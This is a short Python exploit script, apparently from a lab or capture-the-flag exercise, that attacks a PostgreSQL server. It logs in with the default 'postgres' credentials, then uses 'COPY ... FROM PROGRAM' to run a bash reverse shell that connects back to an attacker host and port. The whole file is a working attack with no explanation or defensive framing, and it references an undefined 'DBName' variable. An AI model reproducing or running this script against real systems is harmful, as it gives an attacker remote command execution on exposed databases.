#!/usr/bin/env python3
import psycopg2

RHOST = '192.168.56.47'
RPORT = 5437  # Ensure this is correct
LHOST = '192.168.49.56'
LPORT = 80
USER = 'postgres'
PASSWD = 'postgres'

try:
    with psycopg2.connect(host=RHOST, dbname=DBName, port=RPORT, user=USER, password=PASSWD) as conn:
        cur = conn.cursor()
        print("[!] Connected to the PostgreSQL database")

        # Updated payload using bash
        rev_shell = f"/bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"

        print(f"[*] Executing the payload. Please check if you got a reverse shell!\n")

        cur.execute('DROP TABLE IF EXISTS cmd_exec')
        cur.execute('CREATE TABLE cmd_exec(cmd_output text)')
        cur.execute('COPY cmd_exec FROM PROGRAM \'' + rev_shell  + '\'')
        cur.execute('SELECT * FROM cmd_exec')  # Fixed typo

        v = cur.fetchone()
        print(v)  # Uncommented for debugging

        cur.close()

except Exception as e:
    print(f"[!] Something went wrong: {e}")
